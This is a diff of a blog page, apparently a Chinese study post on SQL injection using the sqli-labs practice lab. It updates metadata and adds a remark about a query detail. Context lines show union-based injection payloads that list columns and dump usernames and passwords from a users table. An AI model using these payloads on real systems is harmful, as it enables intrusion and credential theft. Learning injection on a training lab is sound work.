@@ -106,7 +106,7 @@
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqllab4.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqllab5.PNG">
 <meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqllab6.PNG">
-<meta property="og:updated_time" content="2018-03-04T14:49:24.758Z">
+<meta property="og:updated_time" content="2018-03-07T08:54:34.095Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs学习">
 <meta name="twitter:description" content="借助sqli-labs 系统学习下注入">
@@ -385,6 +385,7 @@
 <p>我们可以发现一共有四张表 其中user表根据经验是最重要的</p>
 <p>所以我们对它进行列名的查询</p>
 <p>?id=-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_scheam=’’ and table_name=’’%23</p>
+<p>(遇到过一个题用table_scheam=就一直不行 但是直接还用table_name=’xxx’就爆出来了)</p>
 <p>发现这张表有三列 id username password</p>
 <p>id=-1’ union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from users %23  </p>
 <p>这里将group_concat和concat_ws函数进行组合使用，一次性列出了所有的信息</p>
@@ -547,7 +548,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">44</span>
+                <span class="site-state-item-count">43</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
